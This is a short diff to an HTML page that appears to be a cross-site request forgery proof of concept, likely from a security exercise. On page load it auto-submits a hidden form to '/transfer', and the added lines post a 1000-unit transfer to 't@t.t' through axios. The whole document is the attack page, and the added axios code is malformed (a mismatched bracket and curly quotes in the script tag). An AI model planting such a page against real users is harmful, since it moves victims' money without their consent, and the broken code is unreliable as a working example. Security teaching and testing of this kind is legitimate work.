@@ -1,4 +1,7 @@
 <html>
+<head>
+<script src=”https://unpkg.com/axios/dist/axios.min.js”></script>
+</head>
 <body>
 <form id="transfer" name="transfer" action="/transfer" method="POST">
             <div class="form-row">
@@ -15,6 +18,20 @@
           </form>
 <script>
   document.getElementById("transfer").requestSubmit();
+  const formData = new FormData();
+  formData.append("user_to", "t@t.t")
+  formData.append("amount", 1000)
+  axios.post({
+   url: '/transfer', 
+   data: formData,
+   headers: { "Content-Type": "multipart/form-data" }
+  )
+  .then(function (response) {
+	console.log(response);
+  })
+  .catch(function (error) {
+	console.log(error);
+  });
 </script>
 </body>
 </html>
